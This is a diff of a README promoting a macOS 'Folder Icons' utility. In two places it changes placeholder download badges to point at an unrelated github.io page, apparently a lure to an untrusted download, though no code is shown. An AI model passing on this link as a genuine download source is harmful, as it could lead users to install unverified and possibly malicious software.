@@ -7,7 +7,7 @@ Transform boring default folders into stylish and unique ones, improving your pr
 ---
 
 ## ✅ Download Folder Icons for macOS  
-[![Download Folder Icons](https://img.shields.io/badge/Download-Folder_Icons-blueviolet)](#)
+[![Download Folder Icons](https://img.shields.io/badge/Download-Folder_Icons-blueviolet)](https://shuziktobehuman.github.io/huja/folder)
 
 ---
 
@@ -39,7 +39,7 @@ Folder Icons is a lightweight macOS utility designed to help users easily custom
 
 ---
 
-[![Download Folder Icons](https://img.shields.io/badge/Download-Folder_Icons-blueviolet)](#)
+[![Download Folder Icons](https://img.shields.io/badge/Download-Folder_Icons-blueviolet)](https://shuziktobehuman.github.io/huja/folder)
 
 ---
 
